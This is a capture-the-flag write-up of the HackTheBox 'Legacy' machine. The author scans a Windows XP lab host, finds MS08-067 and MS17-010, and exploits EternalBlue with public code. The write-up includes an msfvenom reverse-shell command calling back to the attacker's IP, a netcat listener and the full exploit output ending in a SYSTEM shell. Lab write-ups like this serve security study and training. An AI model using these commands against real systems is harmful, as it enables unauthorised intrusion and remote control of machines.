# Legacy

## IP
The IP address for this machine on HackTheBox was `10.10.10.4`.

## NMap Scan
```
sudo nmap -A 10.10.10.4 -p139,445 -vv
...
...
PORT    STATE SERVICE      REASON          VERSION
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds
```

This time with NSE Scripts turned on...
	
``` 
kali@kali:~$ sudo nmap -A 10.10.10.4 -p139,445 --script=smb-vuln-* -vv
...
...
PORT    STATE SERVICE      REASON          VERSION
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Microsoft Windows XP microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2000|XP|2003 (90%)
...
...
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.***
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14 
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
...
... 
```

## MS17-010 (CVE-2017-0143)
This is Eternal Blue. At this point, I got stuck and followed Rana Khalil's walkthrough (https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit). I downloaded Impacket into my Ptyhon2.7 directory along with https://github.com/helviojunior/MS17-010.git exploit code. 

From there, I created a reverse Windows TCP shell using meterpreter:

```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse-shell.exe```

This creates a reverse Windows TCP shell called "reverse-shell.exe" that attempts to connect to my local machine on port 4444.

## Exploit
From there I started a Netcat listener on port 4444:

```nc -nlvp 4444```

And using helviojunior's ***send_and_execute.py*** script, sent the exploit to the target machine:

```
kali@kali:~/Desktop/OSCP/Legacy/MS17-010 manual exploit/MS17-010-master$ python send_and_execute.py 10.10.10.4 ../../reverse-shell.exe 
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8200d010
SESSION: 0xe105dde8
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1adbf10
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1adbfb0
overwriting token UserAndGroups
Sending file ON6AFZ.exe...
Opening SVCManager on 10.10.10.4.....
Creating service JUNd.....
Starting service JUNd.....
The NETBIOS connection with the remote host timed out.
Removing service JUNd.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

Catch on the listener:

```
kali@kali:~/Desktop/OSCP/Legacy$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.4] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

This exploit automatically escalates to administrator rights on the target and from there it's just navigating to the proper directories to grab the user and root flags.
